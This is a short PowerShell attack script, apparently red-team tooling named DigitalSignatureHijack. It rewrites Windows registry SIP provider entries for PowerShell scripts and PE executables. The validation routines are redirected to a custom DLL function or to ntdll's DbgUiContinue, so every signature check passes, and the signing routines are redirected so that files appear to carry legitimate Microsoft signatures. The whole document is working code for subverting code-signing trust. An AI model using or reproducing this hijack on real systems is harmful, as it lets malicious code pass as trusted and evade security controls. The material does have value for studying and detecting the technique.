<#
    DigitalSignatureHijack v1.0
    License: GPLv3
    Author: @netbiosX
#>
# Validate Digital Signature for PowerShell Scripts

function ValidateSignaturePS
{
	$ValidateHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllVerifyIndirectData'

	# PowerShell SIP Guid

	$PSIPGuid = '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'

	$PSSignatureValidation = Get-Item -Path "$ValidateHashFunc\$PSIPGuid\"

	$NewDll = 'C:\Users\User\Desktop\Signature Signing\Binaries\MySIP.dll'
	$NewFuncName = 'AutoApproveHash'
	
	$PSSignatureValidation | Set-ItemProperty -Name Dll -Value $NewDll
	$PSSignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName
}

# Validate Digital Signature for Portable Executables

function ValidateSignaturePE
{
	$ValidateHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllVerifyIndirectData'

	# PE SIP Guid

	$PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'

	$PESignatureValidation = Get-Item -Path "$ValidateHashFunc\$PESIPGuid\"
	
	$NewDll = 'C:\Windows\System32\ntdll.dll'
	$NewFuncName = 'DbgUiContinue'
	
	$PESignatureValidation | Set-ItemProperty -Name Dll -Value $NewDll
	$PESignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName
}

function SignPS
{
	$GetCertFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg'

	# PowerShell SIP Guid

	$PSIPGuid = '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'

	$PEGetMSCert = Get-Item -Path "$GetCertFunc\$PSIPGuid\"

	$NewDll = 'C:\Users\User\Desktop\Signature Signing\Binaries\MySIP.dll'
	$NewFuncName = 'GetLegitMSSignature'
	
	$PEGetMSCert | Set-ItemProperty -Name Dll -Value $NewDll
	$PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName
}

function SignExe
{
	$GetCertFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg'

	# PE SIP Guid

	$PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'

	$PEGetMSCert = Get-Item -Path "$GetCertFunc\$PESIPGuid\"

	$NewDll = 'C:\Users\User\Desktop\Signature Signing\Binaries\MySIP.dll'
	$NewFuncName = 'GetLegitMSSignature'
	
	$PEGetMSCert | Set-ItemProperty -Name Dll -Value $NewDll
	$PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName
}
